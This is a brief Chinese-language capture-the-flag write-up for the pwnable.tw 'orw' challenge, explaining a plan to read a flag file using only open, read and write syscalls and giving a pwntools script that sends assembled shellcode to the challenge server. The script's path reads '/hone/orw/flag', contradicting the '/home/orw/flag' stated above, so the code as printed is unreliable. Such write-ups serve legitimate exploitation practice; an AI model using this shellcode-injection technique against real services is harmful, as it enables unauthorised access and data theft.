# orw 10
>Read the flag from /home/orw/flag.  
Only open read write syscall are allowed to use.  
nc chall.pwnable.tw 10001

# Explore
题目说只允许open read write三个syscall，所以思路是：  
通过open打开flag文件获得fd文件描述符  
通过read读入fd中的内容到内存，内存应该可以是
- esp寄存器中的指针指向的区域
- bss段
- rwdata段  

通过write将内存的数据写到标准输出fd=1中  

**shellcode编写参考**：
- [Unix系统调用表（al值，寄存器对应变量定义）](https://www.cnblogs.com/marklove/articles/10740665.html)
- [pwntools-i386 shellcraft文档](https://docs.pwntools.com/en/stable/shellcraft/i386.html)
# Pwn!
```python
from pwn import *

shellcode = ""
shellcode += pwnlib.shellcraft.open("/hone/orw/flag").rstrip()
shellcode += pwnlib.shellcraft.read('eax','esp',64).rstrip()
shellcode += pwnlib.shellcraft.write(1,'esp',64).rstrip()

p=remote("chall.pwnable.tw",10001)
p.sendline(asm(shellcode))
p.interactive()
```
得到flag